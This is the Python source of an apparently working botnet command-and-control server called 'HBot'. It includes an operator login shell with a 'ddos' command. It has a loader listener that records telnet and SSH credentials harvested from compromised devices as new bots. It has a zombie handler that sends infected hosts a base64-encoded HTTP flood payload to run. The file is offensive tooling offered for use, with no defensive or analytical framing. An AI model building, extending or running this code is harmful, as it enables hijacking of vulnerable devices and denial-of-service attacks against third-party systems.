from lib import network, database, console, tools
import threading, socket, random, time

class Master(threading.Thread):
    def __init__(self, console: console.Console, color: console.Color, database: database.Database, socket_session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session)
        self.database = database
        self.console = console
        self.color = color
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())
        self.login_attemp = 0
        self.kicked_time  = 0
        self.username = None
        self.password = None
        self.logged = False
        self.grade = None

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_user:
                self.database.online_user.remove(self)

            self.console.print_info(f'{self.ip} -> master killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')
    
    def bulk_send(self, packets: list):
        if not self.network.bulk_send_packet(packets):
            self.kill('Error when send packets list')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()
        
        if not data:
            self.kill(f'Invalid data recieved')
            return None
        else:
            return data

    # Custom function
    def set_title(self, title: str):
        self.send(f'\033]0;HBot | {title}\007')

    def clear_screen(self):
        self.send('\033[2J\033[1H')
        self.bulk_send([
            '',
            f'    {self.color.fade("╦.╦╔╗.╔═╗╔╦╗")}'.replace('.', f'{self.color.white}.'),
            f'    {self.color.fade("╠═╣╠╩╗║.║.║.")}'.replace('.', f'{self.color.white}.'),
            f'    {self.color.fade("╩.╩╚═╝╚═╝.╩.")}{self.color.reset}'.replace('.', f'{self.color.white}.'),
            '\r'
        ])

    def loop_thread(self):
        while self.ok:
            time.sleep(1)

            if self.logged:
                self.set_title(f'User: {len(self.database.online_user)} | Bots: {len(self.database.online_zombie)} | Vuln: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)}')
            else:
                self.kicked_time = int(time.time()) - self.session_time
                self.set_title(f'Login page | Attemp: {self.login_attemp}/3 | Kicked on: {self.kicked_time}/30s')

                if self.kicked_time >= 30:
                    self.kill('You did not connect in time !', True)

    def login(self):
        self.clear_screen()

        while self.ok:
            if self.login_attemp == 3:
                self.kill('Max login attemp', True) 
            else:
                self.login_attemp += 1

            self.username = self.recv('Username: ')
            self.password = self.recv('Password: ')

            if self.database.user_valid(self.username, self.password):
                self.grade = self.database.get_user(self.username)['grade']
                self.logged = True
                break
        
        return self.logged

    def prompt(self):
        while self.ok:
            cmd = self.recv(self.color.fade(f'\r{self.username}@HBot ~$ ').replace('@', f'{self.color.white}@') + self.color.white)
            
            if not cmd:
                return

            argument = cmd.split(' ')
            command = argument[0]

            if command == 'ddos':
                if len(argument) < 4:
                    self.send('ddos <method> <ip> <port> <time>')
                
                else:
                    ip = argument[2]
                    port = argument[3]
                    time = argument[4]
                    method = argument[1]

                    for zombie in self.database.online_zombie:
                        zombie.ddos_payload(ip, port, time, method)

    def run(self):
        threading.Thread(target= self.loop_thread).start()

        if self.login():
            self.database.online_user.append(self)
            self.clear_screen()

            self.bulk_send([
                self.color.fade(f'  ╔═══════════════════════════════════~'),
                 self.color.fade('  ║ ') + f'{self.color.reset}Welcome {self.color.underline}{self.color.white}{self.username}{self.color.reset}, Grade: {self.color.green}{self.grade}{self.color.reset}.',
                 self.color.fade('  ║ ') + f'{self.color.reset}Type "{self.color.magenta}help{self.color.reset}" to see commands and "{self.color.magenta}exit{self.color.reset}" to disconnect.',
                self.color.fade(f'  ╚═════════════════════════════════════════════════════~\n'),
            ])
            
            self.prompt()

class Loader(threading.Thread):
    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session)
        self.database = database
        self.console = console
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_loader:
                self.database.online_loader.remove(self)

            self.console.print_info(f'{self.ip} -> loader killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()

        if not data:
            self.kill('Invalid data recieved')
            return None
        else:
            return data

    def loop_thread(self):
        while self.ok:
            time.sleep(60)
            self.send('ping')

    def run(self):
        threading.Thread(target= self.loop_thread).start()
        self.database.online_loader.append(self)

        while self.ok:
            data = self.recv(False)
            
            if data == None:
                return

            if '|' in data:
                args = data.split('|')
                req_type = args[0]

                # scan|127.0.0.1|23|user|pass|telnet
                if req_type == 'scan':
                    ip = args[1]
                    port = args[2]
                    username = args[3]
                    password = args[4]
                    device_type = args[5]

                    count = self.database.create_bot(username, password, ip, port, device_type)
                    if device_type == 'telnet':
                        self.database.total_telnet_bots = count
                    else:
                         self.database.total_ssh_bots = count

                    self.console.print_success(f'{self.ip} -> New {device_type} bot "{username}:{password} {ip}:{port}" -> {count} bots')

class Zombie(threading.Thread):
    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session)
        self.database = database
        self.console = console
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_zombie:
                self.database.online_zombie.remove(self)

            self.console.print_info(f'{self.ip} -> zombie killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()

        if not data:
            self.kill('Invalid data recieved')
            return None
        else:
            return data

    def loop_thread(self):
        while self.ok:
            time.sleep(60)
            self.send('ping')

    def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
        if type == 'http':
            payload = tools.Encoder().base_64(str(open('./payload/http_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())
        
        self.send(f'run|{payload}')

    def run(self):
        threading.Thread(target= self.loop_thread).start()
        self.database.online_zombie.append(self)
        
# Rip this part, anyone optimize ?
class Handler(threading.Thread):
    def __init__(self, database: database.Database, console: console.Console, color: console.Color):
        threading.Thread.__init__(self)
        self.database = database
        self.console = console
        self.color = color

    def master_thread(self, port: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', port))
        self.console.print_success(f'Master -> online -> port: {port}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Master(self.console, self.color, self.database, socket_session, ip, port).start()
    
    def loader_thread(self, port: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', port))
        self.console.print_success(f'Loader -> online -> port: {port}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Loader(self.console, self.database, socket_session, ip, port).start()

    def zombie_thread(self, port: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', port))
        self.console.print_success(f'Zombie -> online -> port: {port}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Zombie(self.console, self.database, socket_session, ip, port).start()

    def run(self):
        threading.Thread(target= self.master_thread, args= (random.randint(1500, 30000),)).start()
        threading.Thread(target= self.loader_thread, args= (random.randint(30001, 55000),)).start()
        threading.Thread(target= self.zombie_thread, args= (random.randint(55001, 65000),)).start()

if __name__ == '__main__':
    Database = database.Database('mongodb+srv://.....')
    Console = console.Console()
    Color = console.Color()

    Console.cnc_banner()
    Handler(Database, Console, Color).start()